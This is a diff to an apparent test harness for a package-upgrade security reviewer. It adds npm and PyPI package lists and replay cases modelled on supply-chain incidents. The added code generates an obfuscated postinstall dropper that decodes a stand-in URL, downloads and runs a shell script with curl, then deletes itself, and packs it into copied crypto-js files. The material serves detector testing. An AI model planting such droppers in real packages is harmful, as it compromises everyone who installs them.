@@ -198,6 +198,85 @@ HELDOUT_NPM = (
     "inquirer",
     "nanoid",
 )
+NEW_NPM = (
+    "esbuild",
+    "sharp",
+    "@swc/core",
+    "prisma",
+    "bcrypt",
+    "sqlite3",
+    "better-sqlite3",
+    "puppeteer",
+    "playwright-core",
+    "@parcel/watcher",
+    "lightningcss",
+    "@biomejs/biome",
+    "turbo",
+    "electron",
+    "cypress",
+    "msw",
+    "core-js",
+    "protobufjs",
+    "es5-ext",
+    "argon2",
+    "canvas",
+    "fsevents",
+    "husky",
+    "nodemon",
+    "@tailwindcss/oxide",
+)
+NEW_PYPI = (
+    "numpy",
+    "pydantic-core",
+    "cryptography",
+    "grpcio",
+    "orjson",
+    "lxml",
+    "psycopg2-binary",
+    "pillow",
+    "pyyaml",
+    "regex",
+    "ujson",
+    "msgpack",
+    "bcrypt",
+    "cffi",
+    "uvloop",
+    "watchfiles",
+    "tokenizers",
+    "safetensors",
+    "rpds-py",
+    "jiter",
+    "coverage",
+    "setuptools",
+    "ddtrace",
+    "opentelemetry-instrumentation",
+    "psutil",
+)
+NEW_PREDICTED_WARN = {
+    "esbuild": "install hook; child_process at import",
+    "sharp": "install hook",
+    "@swc/core": "install hook",
+    "prisma": "install hook; child_process at import",
+    "bcrypt": "install hook",
+    "sqlite3": "install hook",
+    "better-sqlite3": "install hook",
+    "puppeteer": "install hook; child_process/network at import",
+    "@parcel/watcher": "install hook",
+    "electron": "install hook; child_process at import",
+    "cypress": "install hook; child_process at import",
+    "msw": "install hook",
+    "core-js": "install hook",
+    "protobufjs": "install hook",
+    "es5-ext": "install hook",
+    "argon2": "install hook",
+    "canvas": "install hook",
+    "@biomejs/biome": "install hook",
+    "nodemon": "install hook; child_process at import",
+    "coverage": ".pth importing its own module",
+    "setuptools": "distutils-precedence.pth importing its own module",
+    "ddtrace": "nested sitecustomize",
+    "opentelemetry-instrumentation": "nested sitecustomize",
+}
 HELDOUT_PYPI = (
     "pyjwt",
     "bcrypt",
@@ -313,6 +392,39 @@ def select(out: Path, heldout: bool = False) -> None:
     print(f"selected {len(pairs)} pairs -> {out}")
 
 
+def select_new(out: Path) -> None:
+    pairs = []
+    for name in NEW_NPM:
+        try:
+            document = _get_json(f"https://registry.npmjs.org/{name.replace('/', '%2f')}/latest")
+            version = document["version"]
+        except Exception as exc:
+            print("select failed", name, exc, file=sys.stderr)
+            continue
+        pairs.append(_new_pair("npm", name, version))
+    for name in NEW_PYPI:
+        try:
+            version = _get_json(f"https://pypi.org/pypi/{name}/json")["info"]["version"]
+        except Exception as exc:
+            print("select failed", name, exc, file=sys.stderr)
+            continue
+        pairs.append(_new_pair("pypi", name, version))
+    out.write_text(json.dumps(pairs, indent=1) + "\n")
+    print(f"selected {len(pairs)} new packages -> {out}")
+
+
+def _new_pair(ecosystem: str, name: str, version: str) -> dict[str, Any]:
+    note = NEW_PREDICTED_WARN.get(name, "no warn expected")
+    return {
+        "ecosystem": ecosystem,
+        "name": name,
+        "old": None,
+        "new": version,
+        "bump": "new_package",
+        "expected": {"block": [], "warn_note": note},
+    }
+
+
 def _same(text: str, version: Version) -> bool:
     try:
         return Version(text) == version
@@ -357,12 +469,13 @@ def benign(pairs_path: Path, out: Path) -> None:
             started = time.time()
             report = api.review_upgrades(
                 [{key: pair[key] for key in ("ecosystem", "name", "old", "new")}],
-                options={"max_artifact_mb": MAX_ARTIFACT_MB},
+                options={"max_artifact_mb": MAX_ARTIFACT_MB, "max_seconds": 600},
             )
             result = report["results"][0]
             downloads += report["receipt"].get("artifacts_fetched", 0)
             record = {
-                **{name: pair[name] for name in ("ecosystem", "name", "old", "new", "bump")},
+                **{name: pair[name] for name in ("ecosystem", "name", "old", "new")},
+                "bump": pair.get("bump", "new_package"),
                 "expected": pair["expected"],
                 "seconds": round(time.time() - started, 1),
                 "result": result,
@@ -845,7 +958,61 @@ REPLAY = (
         "build": "postmark",
         "expected": {"block": [], "warn": [], "note": "expected miss: no new capability"},
     },
+    {
+        "id": "plain-crypto-js-new-obfuscated",
+        "incident": "axios 1.14.1 (Mar 2026): newly added plain-crypto-js 4.2.1, obfuscated dropper",
+        "source": "synthetic: real crypto-js 4.2.0 contents + postinstall setup.js that decodes "
+        "module names and URL (reversed base64 + XOR), runs a shell download, deletes itself",
+        "pair": ("npm", "plain-crypto-js", None, "4.2.1"),
+        "build": "plain_crypto_new_obfuscated",
+        "expected": {"block": ["new_decode_exec"], "warn": ["new_install_hook"]},
+    },
+    {
+        "id": "plain-crypto-js-new-plain",
+        "incident": "same shape with an unobfuscated dropper (control for the warn-only policy)",
+        "source": "synthetic: real crypto-js 4.2.0 contents + postinstall running curl | sh",
+        "pair": ("npm", "plain-crypto-js", None, "4.2.1"),
+        "build": "plain_crypto_new_plain",
+        "expected": {"block": [], "warn": ["new_import_time_exec", "new_install_hook"]},
+    },
+    {
+        "id": "litellm-1.107.0-new",
+        "incident": "LiteLLM 1.107.0 files reviewed as a newly added package",
+        "source": "synthetic: real litellm 1.83.0 wheel + cook.pth, cook.py, sitecustomize.py",
+        "pair": ("pypi", "litellm", None, "1.107.0"),
+        "build": "litellm_1107",
+        "expected": {
+            "block": ["new_decode_exec", "new_sitecustomize"],
+            "warn": ["new_import_time_exec", "new_import_time_network"],
+        },
+    },
 )
+
+
+def _xor_reverse_b64(text: str, key: str) -> str:
+    mixed = bytes(ord(char) ^ ord(key[index % len(key)]) for index, char in enumerate(text))
+    return base64.b64encode(mixed).decode()[::-1]
+
+
+def _plain_crypto_dropper() -> str:
+    key = "OrDeR_7077"
+    child = _xor_reverse_b64("child_process", key)
+    url = _xor_reverse_b64("https://sfrclak.invalid/6202033", key)
+    return (
+        f"const _k = '{key}';\n"
+        "function _d(s) {\n"
+        "  const b = Buffer.from(s.split('').reverse().join(''), 'base64').toString('latin1');\n"
+        "  let o = '';\n"
+        "  for (let i = 0; i < b.length; i++) {\n"
+        "    o += String.fromCharCode(b.charCodeAt(i) ^ _k.charCodeAt(i % _k.length));\n"
+        "  }\n"
+        "  return o;\n"
+        "}\n"
+        f"const _cp = require(_d('{child}'));\n"
+        f"const _u = _d('{url}');\n"
+        "_cp.exec('curl -s ' + _u + ' -o /tmp/.ld && sh /tmp/.ld');\n"
+        "require('fs').unlinkSync(__filename);\n"
+    )
 
 
 def _build(case: dict[str, Any], registry: _SyntheticRegistry, work: Path) -> None:
@@ -1020,6 +1187,19 @@ def _build(case: dict[str, Any], registry: _SyntheticRegistry, work: Path) -> No
                 "public/fonts/fa-solid-400.woff2": "global.x=1;" + " " * 1400 + "eval('1')\n",
             },
         )
+    elif build in {"plain_crypto_new_obfuscated", "plain_crypto_new_plain"}:
+        source = _npm_package_files("crypto-js", "4.2.0", work)
+        files = {path: text for path, text in source.items() if path != "package.json"}
+        files["setup.js"] = BUN_SETUP.replace("execution.js", "loader.js")
+        if build == "plain_crypto_new_obfuscated":
+            files["setup.js"] = _plain_crypto_dropper()
+        manifest = {
+            "name": "plain-crypto-js",
+            "version": "4.2.1",
+            "main": "index.js",
+            "scripts": {"postinstall": "node setup.js"},
+        }
+        _npm_from_files(registry, "plain-crypto-js", "4.2.1", manifest, files)
     elif build == "postmark":
         _synthetic_npm_package(registry, "postmark-mcp", "1.0.15", {"index.js": POSTMARK_OLD})
         _synthetic_npm_package(registry, "postmark-mcp", "1.0.16", {"index.js": POSTMARK_NEW})
@@ -1169,6 +1349,9 @@ def replay(out: Path, only: set[str] | None = None) -> None:
 def main(argv: list[str]) -> int:
     if len(argv) >= 2 and argv[0] == "select":
         select(Path(argv[1]), heldout="--heldout" in argv[2:])
+        return 0
+    if len(argv) >= 2 and argv[0] == "select-new":
+        select_new(Path(argv[1]))
         return 0
     if len(argv) >= 3 and argv[0] == "benign":
         benign(Path(argv[1]), Path(argv[2]))
